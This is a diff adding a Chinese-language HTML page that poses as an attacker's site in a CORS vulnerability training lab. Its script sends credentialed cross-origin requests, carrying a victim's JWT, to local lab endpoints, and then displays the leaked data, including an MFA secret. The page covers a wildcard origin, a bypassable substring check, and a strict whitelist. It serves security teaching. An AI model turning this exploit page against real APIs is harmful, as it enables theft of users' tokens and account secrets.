@@ -1,0 +1,284 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>⚠️ 攻击者的恶意网站 - CORS 漏洞演示</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body { font-family: Arial, sans-serif; background: #1a1a2e; color: #eee; min-height: 100vh; }
+
+    .banner {
+      background: #c0392b;
+      color: #fff;
+      padding: 14px 24px;
+      font-size: 14px;
+      line-height: 1.8;
+      border-bottom: 3px solid #922b21;
+    }
+    .banner strong { font-size: 16px; }
+    .banner code { background: rgba(0,0,0,.35); padding: 1px 6px; border-radius: 3px; font-size: 13px; }
+
+    .container { max-width: 900px; margin: 28px auto; padding: 0 20px; }
+
+    .card {
+      background: #16213e;
+      border-radius: 8px;
+      padding: 20px 24px;
+      margin-bottom: 20px;
+      border: 1px solid #0f3460;
+    }
+    .card h3 { color: #e94560; margin-bottom: 14px; font-size: 15px; letter-spacing: .5px; }
+
+    label { display: block; font-size: 13px; color: #aaa; margin-bottom: 10px; }
+    label span { display: block; margin-bottom: 4px; }
+    input[type=text] {
+      width: 100%;
+      padding: 9px 12px;
+      background: #0f3460;
+      border: 1px solid #1a4a8a;
+      border-radius: 5px;
+      color: #fff;
+      font-size: 13px;
+    }
+    input[type=text]:focus { outline: none; border-color: #e94560; }
+
+    .hint {
+      font-size: 12px;
+      color: #888;
+      margin-top: 6px;
+      line-height: 1.7;
+    }
+    .hint code {
+      background: #0f3460;
+      padding: 1px 5px;
+      border-radius: 3px;
+      color: #f0a500;
+      font-size: 12px;
+    }
+
+    .origin-info {
+      background: #0f3460;
+      border-radius: 5px;
+      padding: 10px 14px;
+      font-size: 13px;
+      margin-bottom: 14px;
+      line-height: 1.8;
+    }
+    .origin-info .tag {
+      display: inline-block;
+      padding: 1px 8px;
+      border-radius: 3px;
+      font-size: 12px;
+      font-weight: bold;
+    }
+    .tag-red { background: #c0392b; color: #fff; }
+    .tag-blue { background: #2471a3; color: #fff; }
+
+    .btns { display: flex; gap: 10px; flex-wrap: wrap; margin-top: 4px; }
+    button {
+      padding: 9px 20px;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      font-size: 13px;
+      font-weight: bold;
+      transition: opacity .2s;
+    }
+    button:hover { opacity: .85; }
+    button:disabled { opacity: .5; cursor: not-allowed; }
+    .btn-danger  { background: #c0392b; color: #fff; }
+    .btn-warning { background: #d68910; color: #fff; }
+    .btn-safe    { background: #1e8449; color: #fff; }
+
+    #result { margin-top: 20px; }
+
+    .result-box {
+      border-radius: 6px;
+      padding: 16px 18px;
+      margin-bottom: 12px;
+      animation: fadeIn .3s;
+    }
+    @keyframes fadeIn { from { opacity:0; transform:translateY(-6px); } to { opacity:1; transform:translateY(0); } }
+
+    .result-success { background: #2d0000; border: 1px solid #c0392b; }
+    .result-blocked { background: #0d2b10; border: 1px solid #1e8449; }
+    .result-loading { background: #1a1a2e; border: 1px dashed #555; color: #aaa; font-size: 13px; }
+
+    .result-box h4 { margin-bottom: 10px; font-size: 14px; }
+    .result-box .meta { font-size: 12px; color: #888; margin-bottom: 10px; line-height: 1.7; }
+    .result-box .meta code { background: #0a0a1a; padding: 1px 5px; border-radius: 3px; color: #ccc; }
+
+    table { width: 100%; border-collapse: collapse; font-size: 13px; margin-top: 8px; }
+    td { padding: 8px 12px; border-bottom: 1px solid #0f3460; vertical-align: top; }
+    td:first-child { color: #aaa; width: 140px; white-space: nowrap; }
+    td:last-child { color: #f0a500; word-break: break-all; }
+    tr.sensitive td:last-child { color: #e74c3c; font-weight: bold; }
+  </style>
+</head>
+<body>
+
+<div class="banner">
+  <strong>⚠️ 这是模拟攻击者控制的恶意网站（仅用于 CORS 漏洞演示）</strong><br>
+  当前页面 Origin：<code id="currentOrigin">加载中...</code>
+  &nbsp;|&nbsp;
+  攻击目标 API Origin：<code id="targetOriginDisplay">http://127.0.0.1:8080</code>
+</div>
+
+<div class="container">
+
+  <!-- 场景说明 -->
+  <div class="card">
+    <h3>📖 攻击场景</h3>
+    <div class="origin-info">
+      <span class="tag tag-red">攻击者网站</span> &nbsp;<span id="attackerOriginFull" style="color:#e94560;"></span>
+      &nbsp;&nbsp;→&nbsp;&nbsp;
+      <span class="tag tag-blue">目标 API</span> &nbsp;<span id="targetOriginFull" style="color:#5dade2;"></span>
+      <br>
+      <span style="color:#ccc;font-size:12px;margin-top:6px;display:block;">
+        两者 Origin 不同（端口不同），浏览器的 CORS 规则生效。<br>
+        若目标 API 存在 CORS 配置漏洞，本页面的 JS 可读取受害者的敏感数据。
+      </span>
+    </div>
+    <p style="font-size:13px;color:#ccc;line-height:1.9;">
+      受害者已登录靶场并持有有效 JWT Token，随后访问了本恶意网站。<br>
+      本页面 JavaScript 将携带受害者 Token，向靶场 API 发起跨域请求，尝试窃取敏感数据。
+    </p>
+    <div style="margin-top:14px;padding:10px 14px;background:#1a2a1a;border:1px solid #2e5c2e;border-radius:5px;font-size:12px;line-height:1.9;color:#ccc;">
+      <strong style="color:#f0a500;">📌 三种场景的攻击预期：</strong><br>
+      <span style="color:#e74c3c;">①</span> <strong>漏洞1（Origin 完全信任）</strong>：<code>addAllowedOriginPattern("*")</code>，任意来源均放行 → <span style="color:#e74c3c;">攻击成功</span><br>
+      <span style="color:#e74c3c;">②</span> <strong>漏洞2（Origin 校验可绕过）</strong>：<code>addAllowedOriginPattern("*127.0.0.1*")</code>，本意限制本机，<br>
+      &nbsp;&nbsp;&nbsp;&nbsp;但本页面 Origin（<code id="attackerOriginInline"></code>）也包含 <code>127.0.0.1</code> → <span style="color:#e74c3c;">绕过成功</span><br>
+      <span style="color:#27ae60;">③</span> <strong>安全版（严格白名单）</strong>：<code>addAllowedOrigin("http://trusted.secnotes.icu")</code>，本页面不在白名单 → <span style="color:#27ae60;">CORS 拦截</span>
+    </div>
+  </div>
+
+  <!-- 配置 -->
+  <div class="card">
+    <h3>⚙️ 配置</h3>
+    <label>
+      <span>靶场后端 API 地址</span>
+      <input type="text" id="backendUrl" value="http://127.0.0.1:8080">
+    </label>
+    <label style="margin-top:14px;">
+      <span>受害者 JWT Token</span>
+      <input type="text" id="jwtToken" placeholder="将受害者的 Authorization Token 粘贴到这里...">
+    </label>
+    <p class="hint">
+      获取方式：在靶场页面（<code id="labUrl"></code>）按 <strong>F12</strong> → 控制台，输入以下命令并复制结果：<br>
+      <code>localStorage.getItem('Authorization')</code>
+    </p>
+  </div>
+
+  <!-- 攻击按钮 -->
+  <div class="card">
+    <h3>🎯 发起跨域请求攻击</h3>
+    <div class="btns">
+      <button class="btn-danger"
+        onclick="attack('/cors/vuln1/sensitiveData', '漏洞1：Origin 完全信任', this)">
+        ① 攻击 漏洞1（Origin 完全信任）
+      </button>
+      <button class="btn-warning"
+        onclick="attack('/cors/vuln2/sensitiveData', '漏洞2：Origin 校验可绕过（contains 绕过）', this)">
+        ② 攻击 漏洞2（contains "127.0.0.1" 被绕过）
+      </button>
+      <button class="btn-safe"
+        onclick="attack('/cors/secure/sensitiveData', '安全版（白名单保护）', this)">
+        ③ 测试 安全版（白名单保护）
+      </button>
+    </div>
+    <div id="result"></div>
+  </div>
+
+</div>
+
+<script>
+  // 显示当前 Origin
+  var currentOrigin = window.location.origin;
+  document.getElementById('currentOrigin').textContent = currentOrigin;
+  document.getElementById('attackerOriginFull').textContent = currentOrigin;
+  document.getElementById('attackerOriginInline').textContent = currentOrigin;
+
+  // 后端默认地址：与当前页面同 hostname，端口固定 8080
+  var defaultBackend = window.location.protocol + '//' + window.location.hostname + ':8080';
+  document.getElementById('backendUrl').value = defaultBackend;
+
+  function updateTargetOrigin() {
+    var url = document.getElementById('backendUrl').value.trim();
+    try {
+      var origin = new URL(url).origin;
+      document.getElementById('targetOriginDisplay').textContent = origin;
+      document.getElementById('targetOriginFull').textContent = origin;
+    } catch(e) {}
+  }
+  document.getElementById('backendUrl').addEventListener('input', updateTargetOrigin);
+  updateTargetOrigin();
+
+  // 动态填写靶场地址提示
+  document.getElementById('labUrl').textContent =
+    window.location.protocol + '//' + window.location.hostname + ':80';
+
+  async function attack(path, label, btn) {
+    var backendUrl = document.getElementById('backendUrl').value.trim().replace(/\/$/, '');
+    var jwt = document.getElementById('jwtToken').value.trim();
+    var resultDiv = document.getElementById('result');
+
+    // 禁用所有按钮防止重复点击
+    document.querySelectorAll('button').forEach(function(b){ b.disabled = true; });
+
+    resultDiv.innerHTML = '<div class="result-box result-loading">⏳ 正在发起跨域请求：<code>' + backendUrl + path + '</code> ...</div>';
+
+    var headers = { 'Content-Type': 'application/json' };
+    if (jwt) headers['Authorization'] = jwt;
+
+    try {
+      var resp = await fetch(backendUrl + path, {
+        method: 'GET',
+        credentials: 'include',
+        headers: headers
+      });
+
+      var json = await resp.json();
+      var data = json.data || json;
+
+      // 过滤掉以 _ 开头的内部字段
+      var rows = Object.keys(data)
+        .filter(function(k) { return !k.startsWith('_'); })
+        .map(function(k) {
+          var isSensitive = k === 'mfaSecret';
+          return '<tr' + (isSensitive ? ' class="sensitive"' : '') + '><td>' + k + '</td><td>' + (data[k] || '—') + '</td></tr>';
+        }).join('');
+
+      resultDiv.innerHTML =
+        '<div class="result-box result-success">' +
+        '<h4 style="color:#e94560;">⚠️ ' + label + '—— 攻击成功！跨域读取到受害者敏感数据</h4>' +
+        '<div class="meta">' +
+        '攻击方 Origin：<code>' + currentOrigin + '</code><br>' +
+        '目标 API：<code>' + backendUrl + path + '</code><br>' +
+        '响应状态：<code>HTTP ' + resp.status + '</code>（浏览器未阻止，JS 可读取响应内容）' +
+        '</div>' +
+        '<table>' + rows + '</table>' +
+        '</div>';
+
+    } catch (e) {
+      resultDiv.innerHTML =
+        '<div class="result-box result-blocked">' +
+        '<h4 style="color:#27ae60;">✅ ' + label + '—— CORS 防护生效，攻击被阻止</h4>' +
+        '<div class="meta">' +
+        '攻击方 Origin：<code>' + currentOrigin + '</code><br>' +
+        '目标 API：<code>' + backendUrl + path + '</code><br>' +
+        '浏览器报错：<code>' + e.message + '</code>' +
+        '</div>' +
+        '<p style="font-size:13px;color:#ccc;">' +
+        '浏览器在预检（OPTIONS）阶段发现响应中无匹配的 <code>Access-Control-Allow-Origin</code>，<br>' +
+        '直接拦截请求，攻击者的 JS 无法读取任何响应内容。' +
+        '</p>' +
+        '</div>';
+    } finally {
+      document.querySelectorAll('button').forEach(function(b){ b.disabled = false; });
+    }
+  }
+</script>
+
+</body>
+</html>
